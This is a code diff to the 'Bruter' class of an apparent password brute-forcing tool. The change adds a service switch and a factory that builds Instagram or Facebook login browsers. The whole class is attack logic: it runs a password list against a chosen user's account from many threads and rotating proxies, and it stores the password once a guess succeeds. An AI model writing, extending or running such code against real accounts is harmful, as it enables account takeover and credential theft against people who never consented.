@@ -3,7 +3,6 @@
 # Description: Bruter
 
 from time import time, sleep
-from lib.browser import Browser
 from lib.display import Display
 from threading import Thread, RLock
 from lib.proxy_manager import ProxyManager
@@ -11,22 +10,21 @@ from lib.password_manager import PasswordManager
 from lib.const import max_time_to_wait, max_bots_per_proxy
 
 
-class Bruter(object):
-
-    def __init__(self, username, threads, passlist_path):
+class Bruter:
+    def __init__(self, service, username, threads, passlist_path):
         self.browsers = []
         self.lock = RLock()
         self.password = None
         self.is_alive = True
         self.is_found = False
         self.bots_per_proxy = 0
+        self.service = service.casefold().strip()
         self.username = username
         self.last_password = None
         self.active_passwords = []
         self.proxy_manager = ProxyManager()
         self.display = Display(username, passlist_path)
-        self.password_manager = PasswordManager(username,
-                                                passlist_path, threads, self.display)
+        self.password_manager = PasswordManager(service, username, passlist_path, threads, self.display)
 
     def manage_session(self):
         if self.password_manager.is_read:
@@ -41,21 +39,17 @@ class Bruter(object):
 
     def browser_manager(self):
         while self.is_alive:
-
             for browser in self.browsers:
-
                 if not self.is_alive:
                     break
 
-                if Display.account_exists == None and Browser.account_exists != None:
-                    Display.account_exists = Browser.account_exists
+                account_exists = self.create_browser(None, None).__class__.account_exists
+                if Display.account_exists is None and account_exists is not None:
+                    Display.account_exists = account_exists
 
                 if not browser.is_active:
-
                     password = browser.password
-
                     if browser.is_attempted and not browser.is_locked:
-
                         if browser.is_found and not self.is_found:
                             self.password = password
                             self.is_found = True
@@ -77,9 +71,19 @@ class Bruter(object):
         if browser in self.browsers:
             with self.lock:
                 self.browsers.pop(self.browsers.index(browser))
-                self.active_passwords.pop(
-                    self.active_passwords.index(browser.password)
-                )
+                self.active_passwords.pop(self.active_passwords.index(browser.password))
+
+    def create_browser(self, password, proxy):
+        from lib.browsers.instagram import InstagramBrowser
+        from lib.browsers.facebook import FacebookBrowser
+
+        if self.service == 'instagram':
+            return InstagramBrowser(self.username, password, proxy)
+        if self.service == 'facebook':
+            return FacebookBrowser(self.username, password, proxy)
+        else:
+            self.display.warning('Browser not found for service {}'.format(self.service))
+            raise RuntimeError('')
 
     def attack(self):
         proxy = None
@@ -102,8 +106,8 @@ class Bruter(object):
                 if not proxy:
                     continue
 
-                if not password in self.active_passwords and password in self.password_manager.passlist:
-                    browser = Browser(self.username, password, proxy)
+                if password not in self.active_passwords and password in self.password_manager.passlist:
+                    browser = self.create_browser(password, proxy)
                     browsers.append(browser)
                     self.bots_per_proxy += 1
 
@@ -151,15 +155,12 @@ class Bruter(object):
 
         last_attempt = 0
         while self.is_alive and not self.is_found:
-
             if last_attempt == self.password_manager.attempts and self.password_manager.attempts:
                 sleep(1.5)
                 continue
 
             for browser in self.browsers:
-
-                self.display.stats(
-                    browser.password, self.password_manager.attempts, len(self.browsers))
+                self.display.stats(browser.password, self.password_manager.attempts, len(self.browsers))
                 last_attempt = self.password_manager.attempts
                 self.last_password = browser.password
 
